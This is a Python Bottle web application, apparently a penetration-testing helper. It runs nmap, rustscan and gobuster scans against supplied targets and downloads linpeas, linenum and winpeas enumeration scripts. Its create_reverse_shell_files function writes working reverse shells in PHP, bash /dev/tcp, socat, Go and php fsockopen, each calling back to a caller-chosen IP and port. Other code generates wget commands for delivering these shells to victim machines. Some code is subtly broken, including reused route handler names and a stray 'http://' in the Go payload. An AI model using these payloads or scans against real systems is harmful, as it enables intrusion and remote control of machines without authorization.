from converter import CommandResultConverter
from command_executor import GobusterCommandExecutor, NmapCommandExecutor, RustScanCommandExecutor
from bottle import Bottle, template, request, response, static_file, redirect
import requests
import pathlib
import uuid 
from app_settings import *


###########################################################
##
## MAIN APPLICATION DEFINITION
## 
###########################################################
app = Bottle()


### application hooks

@app.hook('before_request')
def log_request():
    
    log_string = ""

    log_string += f"url = {request.url} \n"
    for index, key in enumerate (list(request.params.keys())):
        request.params[key] = str(request.params[key]).strip()
        log_string += f"{key} = {request.params[key]} \n"

    print(log_string)


###########################################################
##
## APIS FOR CLIENTS
## 
###########################################################
@app.route("/")
def start():
    return template("index.html", output=get_app_urls())

@app.route(get_command_output_redirect_url())
def get_command_output():
    output_file_text_content = pathlib.Path(get_command_output_path(request.query.request_id)).read_text()
    return CommandResultConverter.to_html(output_file_text_content)

@app.route("/generate-resources")
def generate_resources():
    download_enum_scripts_from_official_repos()
    create_reverse_shell_files(request.query.ip, request.query.port)
    # get_reverse_shell_content(request.query.ip)
    return template("resources.html", output=get_reverse_shell_content(request.query.ip))

@app.route('/download/<filename:path>')
def download(filename):
    return static_file(filename.lower(), root=get_resource_by_file_name(), download=True)

@app.route("/client/get-all-api-endpoint-urls")
def start():
    return get_app_urls()






###########################################################
##
## INFORMATION GATHERING
## 
###########################################################

### network/scanner/nmap/

@app.route('/information-gathering/network/scanner/nmap/version')
def network_scanner_nmap_version():
    nmap_cmd = NmapCommandExecutor(request.query.ip, request.query.ports)
    request_id = nmap_cmd.services_version_scan()
    redirect(get_command_output_redirect_url(request_id))

@app.route('/information-gathering/network/scanner/nmap/aggressive')
def network_scanner_nmap_aggressive():
    nmap_cmd = NmapCommandExecutor(request.query.ip, request.query.ports)
    request_id = nmap_cmd.aggressive_scan()
    redirect(get_command_output_redirect_url(request_id))





### network/scanner/rustscan

@app.route('/information-gathering/network/scanner/rustscan/scan')
def network_scanner_rustscan_scan():
    rustscan_cmd = RustScanCommandExecutor(request.query.ip, request.query.ports, request.query.range)
    request_id = rustscan_cmd.scan()
    redirect(get_command_output_redirect_url(request_id))





### webapp/scanner/gobuster

@app.route('/information-gathering/webapp/scanner/gobuster/enumerate-url-big-dirb-dictionary')
def network_scanner_rustscan():
    gobuster_cmd = GobusterCommandExecutor(request.query.address)
    request_id = gobuster_cmd.enumerate_url_big_dirb_dictionary()
    redirect(get_command_output_redirect_url(request_id))

@app.route('/information-gathering/webapp/scanner/gobuster/enumerate-url-big-dirb-dictionary-common-extensions')
def network_scanner_rustscan():
    gobuster_cmd = GobusterCommandExecutor(request.query.address)
    request_id = gobuster_cmd.enumerate_url_big_dirb_dictionary_common_extensions()
    redirect(get_command_output_redirect_url(request_id))

@app.route('/information-gathering/webapp/scanner/gobuster/enumerate-url-small-dirbuster-dictionary')
def network_scanner_rustscan():
    gobuster_cmd = GobusterCommandExecutor(request.query.address)
    request_id = gobuster_cmd.enumerate_url_small_dirbuster_dictionary()
    redirect(get_command_output_redirect_url(request_id))

@app.route('/information-gathering/webapp/scanner/gobuster/enumerate-url-small-dirbuster-dictionary-common-extension')
def network_scanner_rustscan():
    gobuster_cmd = GobusterCommandExecutor(request.query.address)
    request_id = gobuster_cmd.enumerate_url_small_dirbuster_dictionary_common_extensions()
    redirect(get_command_output_redirect_url(request_id))




###########################################################
## 
## APP FUNCTIONS
## 
###########################################################
def get_app_urls():
    app_urls = []

    for index in range(len(app.routes)):
        app_urls.append(app.routes[index].rule)     

    return_object = { "data": app_urls}
    return return_object

def download_enum_scripts_from_official_repos():
    with open(get_resource_by_file_name('linpeas.sh'), 'w') as f:
        f.write(requests.get(LINPEAS_REPOSITORY_URL, allow_redirects=True).text)
    with open(get_resource_by_file_name('linenum.sh'), 'w') as f:
        f.write(requests.get(LINENUM_REPOSITORY_URL, allow_redirects=True).text)
    with open(get_resource_by_file_name('winpeas.bat'), 'w') as f:
        f.write(requests.get(WINPEAS_REPOSITORY_URL, allow_redirects=True).text)

def create_reverse_shell_files(ip, port):
    with open(get_resource_by_file_name(PHP_REVERSE_SHELL_FILE_NAME), 'w') as f:
        f.write(f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'");?>""")
    with open(get_resource_by_file_name(BASH_REVERSE_SHELL_FILE_NAME), 'w') as f:
        f.write(f"""bash -i >& /dev/tcp/{ip}/{port} 0>&1""")
    with open(get_resource_by_file_name(SOCAT_REVERSE_SHELL_FILE_NAME), 'w') as f:
        f.write(f"""socat tcp:{ip}:{port} exec:'bash -i' ,pty,stderr,setsid,sigint,sane &""")
    with open(get_resource_by_file_name(GOLANG_REVERSE_SHELL_FILE_NAME), 'w') as f:
        f.write(f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}}'>/tmp/sh.go&&go run /tmp/sh.go""")
    with open(get_resource_by_file_name(PHP_CMD_REVERSE_SHELL_FILE_NAME), 'w') as f:
        f.write(f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""")

def get_reverse_shell_content(ip):

    reverse_shell_list = []

    reverse_shell_list.append({
        'wget_command': f"wget {ip}:{APP_PORT}/download/{PHP_REVERSE_SHELL_FILE_NAME} /tmp/{PHP_REVERSE_SHELL_FILE_NAME}",
        'file_name': PHP_REVERSE_SHELL_FILE_NAME,
        'file_content': pathlib.Path(get_resource_by_file_name(PHP_REVERSE_SHELL_FILE_NAME)).read_text()
    })

    reverse_shell_list.append({
        'wget_command': f"wget {ip}:{APP_PORT}/download/{BASH_REVERSE_SHELL_FILE_NAME} /tmp/{BASH_REVERSE_SHELL_FILE_NAME}",
        'file_name': BASH_REVERSE_SHELL_FILE_NAME,
        'file_content': pathlib.Path(get_resource_by_file_name(BASH_REVERSE_SHELL_FILE_NAME)).read_text()
    })

    reverse_shell_list.append({
        'wget_command': f"wget {ip}:{APP_PORT}/download/{SOCAT_REVERSE_SHELL_FILE_NAME} /tmp/{SOCAT_REVERSE_SHELL_FILE_NAME}",
        'file_name':  SOCAT_REVERSE_SHELL_FILE_NAME,
        'file_content': pathlib.Path(get_resource_by_file_name(SOCAT_REVERSE_SHELL_FILE_NAME)).read_text()
    })

    reverse_shell_list.append({
        'wget_command': f"wget {ip}:{APP_PORT}/download/{GOLANG_REVERSE_SHELL_FILE_NAME} /tmp/{GOLANG_REVERSE_SHELL_FILE_NAME}",
        'file_name': GOLANG_REVERSE_SHELL_FILE_NAME,
        'file_content': pathlib.Path(get_resource_by_file_name(GOLANG_REVERSE_SHELL_FILE_NAME)).read_text()
    })

    reverse_shell_list.append({
        'wget_command': f"wget {ip}:{APP_PORT}/download/{PHP_CMD_REVERSE_SHELL_FILE_NAME} /tmp/{PHP_CMD_REVERSE_SHELL_FILE_NAME}",
        'file_name': PHP_CMD_REVERSE_SHELL_FILE_NAME,
        'file_content': pathlib.Path(get_resource_by_file_name(PHP_CMD_REVERSE_SHELL_FILE_NAME)).read_text()
    })

    return reverse_shell_list



###########################################################
## 
## MAIN
## 
###########################################################
if __name__ == '__main__':
    app.run(host=APP_IP, port=APP_PORT, debug=True, reloader=True)

# app = default_app()